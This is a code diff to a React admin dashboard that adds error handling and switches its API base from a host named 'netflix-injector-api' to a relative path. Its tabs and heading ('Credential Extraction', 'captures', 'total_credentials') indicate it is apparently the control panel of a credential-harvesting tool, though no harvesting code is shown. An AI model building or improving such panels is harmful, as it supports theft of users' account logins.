@@ -8,7 +8,10 @@ function App() {
   const [loading, setLoading] = useState(false)
   const [stats, setStats] = useState({ total_captures: 0, total_credentials: 0 })
 
-  const API_BASE = 'https://netflix-injector-api.onrender.com/v1/admin'
+  const [error, setError] = useState(null)
+
+  // Use relative path for universal support (local & production)
+  const API_BASE = '/v1/admin'
 
   useEffect(() => {
     fetchData()
@@ -16,9 +19,15 @@ function App() {
 
   const fetchData = async () => {
     setLoading(true)
+    setError(null)
     try {
       const endpoint = activeTab === 'captures' ? '/captures' : '/credentials'
       const res = await fetch(`${API_BASE}${endpoint}`)
+
+      if (!res.ok) {
+        throw new Error(`Server returned ${res.status}: ${res.statusText}`)
+      }
+
       const json = await res.json()
 
       if (activeTab === 'captures') {
@@ -30,6 +39,7 @@ function App() {
       }
     } catch (err) {
       console.error('Fetch error:', err)
+      setError(err.message)
     } finally {
       setLoading(false)
     }
@@ -83,6 +93,12 @@ function App() {
           <h1>{activeTab === 'captures' ? 'Audit Logs' : 'Credential Extraction'}</h1>
           <button className="refresh-btn" onClick={fetchData}>Refresh</button>
         </header>
+
+        {error && (
+          <div className="error-banner animate-fade">
+            ⚠️ <strong>Error:</strong> {error}
+          </div>
+        )}
 
         {loading ? (
           <div className="loader">Synchronizing with Node...</div>
